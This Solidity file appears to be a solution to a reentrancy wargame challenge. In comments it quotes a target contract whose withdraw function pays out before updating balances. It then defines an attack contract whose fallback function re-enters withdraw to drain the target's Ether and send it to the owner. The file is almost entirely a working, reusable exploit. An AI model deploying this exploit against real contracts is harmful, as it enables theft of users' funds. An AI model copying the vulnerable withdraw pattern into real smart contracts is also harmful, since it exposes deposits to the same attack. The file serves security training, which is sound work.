// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;
import "./utils/SafeMath.sol";

// contract Reentrance {
//     using SafeMath for uint256;
//     mapping(address => uint) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint balance) {
//         return balances[_who];
//     }

//     function withdraw(uint _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             // msg.sender.call in solidity 0.6.0
//             (bool result, ) = msg.sender.call.value(_amount)("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }
interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract AttackReentrance {
    address public owner;
    uint public deposit;
    Reentrance public exploit;
    uint targetValue = 1000000000000000;

    constructor(address payable addr) public {
        exploit = Reentrance(addr);
        owner = msg.sender;
    }

    function withdraw() public {
        require(msg.sender == owner);
        (bool result, ) = msg.sender.call.value(address(this).balance)("");
        require(result, "withdraw failed");
    }

    function Attack() external payable {
        require(msg.value >= targetValue, "Not enough Eth");
        deposit = msg.value;
        exploit.donate.value(msg.value)(address(this));
        exploit.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(exploit).balance;
        if (targetBalance >= targetValue) {
            exploit.withdraw(targetValue);
        }
    }
}
